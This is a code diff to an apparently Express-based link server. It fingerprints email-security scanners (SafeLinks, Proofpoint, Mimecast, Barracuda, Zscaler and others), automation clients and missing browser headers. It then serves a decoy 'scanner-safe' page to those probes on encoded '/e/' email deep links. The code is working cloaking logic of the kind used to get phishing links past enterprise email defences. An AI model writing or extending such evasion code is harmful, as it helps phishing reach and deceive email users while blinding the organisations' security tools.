@@ -731,50 +731,109 @@ function countryBlocked(country){
 function asnBlocked(asn){ return !!asn && BLOCKED_ASNS.includes(asn); }
 
 // ================== SCANNER DETECTION ==================
-const SCANNER_PATTERNS = [
-  {
-    pattern: /safelinks\.protection\.outlook\.com|microsoft.*safelinks/i,
-    name: "Microsoft SafeLinks",
-    confidence: 0.95,
-    type: "enterprise"
-  },
-  {
-    pattern: /proofpoint|ppops-.*-(\d+)/i,
-    name: "Proofpoint TAP",
-    confidence: 0.90,
-    type: "enterprise" 
-  },
-  {
-    pattern: /mimecast|mimecast-control-center/i,
-    name: "Mimecast",
-    confidence: 0.90,
-    type: "enterprise"
-  },
-  {
-    pattern: /barracuda|bemailhec/i,
-    name: "Barracuda",
-    confidence: 0.85,
-    type: "enterprise"
-  },
-  {
-    pattern: /(microsoft-office|outlook).*scan|eop/i,
-    name: "Office 365 EOP",
-    confidence: 0.80,
-    type: "enterprise"
-  },
-  {
-    pattern: /url.*proxy|link.*scan|security.*scan/i,
-    name: "Generic URL Scanner",
-    confidence: 0.70,
-    type: "generic"
-  },
-  {
-    pattern: /apwk/i,
-    name: "APWK Scanner",
-    confidence: 0.75,
-    type: "generic"
-  }
-];
+const SCANNER_PATTERNS = {
+  // High-signal vendor/user-agent substrings (case-insensitive)
+  uaSubstrings: [
+    // Microsoft / Outlook / EOP / SafeLinks
+    'safelinks', 'protection.outlook.com', 'microsoft eop', 'exchange online',
+    'microsoft-office', 'outlook', 'x-owa',
+
+    // Proofpoint
+    'proofpoint', 'urldefense.proofpoint.com', 'ppops-', 'tap/',
+
+    // Mimecast
+    'mimecast', 'mimecast-control-center', 'protect-us.mimecast.com',
+    'protect-eu.mimecast.com', 'protect-au.mimecast.com',
+
+    // Barracuda
+    'barracuda', 'bemailhec', 'linkprotect.cudasvc.com',
+
+    // Cisco / IronPort
+    'ironport', 'cisco secure email', 'sesa.cisco',
+
+    // Trend Micro
+    'trendmicro', 'tmurl', 'tmresponse', 'deep discovery', 'ddan',
+
+    // McAfee / Trellix / FireEye / Cloudmark
+    'mcafee', 'clickprotect', 'trellix', 'fireeye', 'cloudmark',
+
+    // Zscaler / Forcepoint / Fortinet
+    'zscaler', 'zscloud', 'forcepoint', 'websense', 'fortimail', 'fortinet',
+
+    // Google/Gmail prefetch
+    'googleimageproxy', 'gmail proxy', 'google proxy',
+
+    // Apple Mail Privacy
+    'apple mail privacy', 'mailprivacy',
+
+    // Generic
+    'url defense', 'urlrewrite', 'link protect', 'linkprotect',
+    'link-scanner', 'security scan', 'sandbox url'
+  ],
+
+  // Strong regex hits for vendor/rewriter signatures
+  uaRegexes: [
+    // Microsoft SafeLinks / EOP / Outlook apps
+    /safelinks\.protection\.outlook\.com|(?:nam|eur|apc)\d+\.safelinks/i,
+    /(microsoft[- ]?office|outlook|exchange).*(scan|eop)/i,
+    /Microsoft[- ]?Office\/[0-9.]+/i,
+    /Outlook-(?:Android|iOS)\/[0-9.]+/i,
+
+    // Proofpoint
+    /urldefense\.(proofpoint|com)/i,
+    /Proofpoint(?:|-[A-Za-z]+)\/[0-9.]+/i,
+    /ppops-[a-z0-9-]+/i,
+
+    // Mimecast
+    /mimecast|protect-(?:us|eu|au)\.mimecast\.com/i,
+
+    // Barracuda
+    /barracuda|bemailhec|linkprotect\.cudasvc\.com/i,
+
+    // Cisco / IronPort
+    /ironport|secure\.email|sesa\.cisco/i,
+
+    // Trend Micro
+    /trend[\s-]?micro|tmurl|tmresponse|deep\s*discovery|ddan/i,
+
+    // McAfee / Trellix / FireEye / Cloudmark
+    /mcafee|clickprotect|cp\.mcafee\.com/i,
+    /trellix|fireeye|cloudmark/i,
+
+    // Zscaler / Forcepoint / Fortinet
+    /zscaler|zsgov|zscloud|zscalertwo|zscalerthree/i,
+    /forcepoint|websense/i,
+    /fortinet|fortimail|fortiguard/i,
+
+    // Headless/automation (keep weight low in your scoring)
+    /(headless|puppeteer|playwright|phantomjs|selenium|wdio|cypress|curl|wget|python-requests|aiohttp|okhttp|java\/|go-http)/i,
+  ],
+
+  // Header fingerprints (browser hints often missing in scanners)
+  headerRules: [
+    // Missing typical browser hints
+    (h) => !h['accept-language'],
+    (h) => !h['sec-ch-ua'],
+    (h) => !h['sec-fetch-mode'],
+    (h) => !h['upgrade-insecure-requests'],
+
+    // Suspicious combinations
+    (h) => (h['sec-fetch-site']||'').toLowerCase() === 'none',
+    (h) => (h['sec-fetch-mode']||'').toLowerCase() === 'no-cors',
+
+    // No cookies or referer on a deep/first touch
+    (h) => !h['cookie'],
+    (h) => !h['referer'],
+  ],
+
+  // Methods scanners often use for “peek” fetches
+  methods: ['HEAD', 'OPTIONS'],
+
+  // Optional infra hints if you later pipe in reverse DNS / ASN (leave empty if unused)
+  rdnsHints: [
+    // 'pphosted.com', 'mimecast.com', 'barracudanetworks.com'
+  ],
+};
 
 const EXTERNAL_SCANNER_CONFIG = process.env.SCANNER_CONFIG_URL || null;
 let dynamicScanners = [];
@@ -1014,6 +1073,59 @@ function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
   <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
 </body>`);
 }
+
+// --- Early short-circuit for HEAD/OPTIONS scanner-style probes on deep links ---
+app.use((req, res, next) => {
+  // allow your own health, logs, and challenge endpoints through
+if (
+  req.path === '/health' ||
+  req.path.startsWith('/view-log') ||
+  req.path.startsWith('/challenge') ||
+  req.path.startsWith('/ts-client-log')
+) {
+  return next();
+}
+
+  // only care about HEAD/OPTIONS prefetches (scanner probes)
+  if (req.method !== 'HEAD' && req.method !== 'OPTIONS') return next();
+
+  // If you treat email deep-links with /e/<payload>, short-circuit them
+  if (req.path.startsWith('/e/')) {
+    const clean = (req.originalUrl || '').slice(3).split('?')[0];
+    return renderScannerSafePage(res, clean, `${req.method}-probe`);
+  }
+
+  // heuristic "deep" link detector: long base64-like path + no cookies
+  const looksDeep =
+    (req.originalUrl || '').length > 80 &&
+    /[A-Za-z0-9+/=_-]{40,}/.test(req.originalUrl || '') &&
+    !req.headers['cookie'];
+
+  if (looksDeep) {
+    const clean = (req.originalUrl || '').replace(/^\//, '').split('?')[0];
+    return renderScannerSafePage(res, clean, `${req.method}-probe`);
+  }
+
+  return next();
+});
+
+// --- OPTIONAL: catch GET probes on /e/... and show the safe interstitial ---
+app.use((req, res, next) => {
+  // Let your own endpoints through untouched
+  if (
+    req.path === '/health' ||
+    req.path.startsWith('/view-log') ||
+    req.path.startsWith('/challenge') ||
+    req.path.startsWith('/ts-client-log')
+  ) return next();
+
+  if (req.method === 'GET' && req.path.startsWith('/e/')) {
+    const clean = (req.originalUrl || '').slice(3).split('?')[0];
+    return renderScannerSafePage(res, clean, 'GET-probe');
+  }
+
+  next();
+});
 
 function checkSecurityPolicies(req) {
   const ip = getClientIp(req);
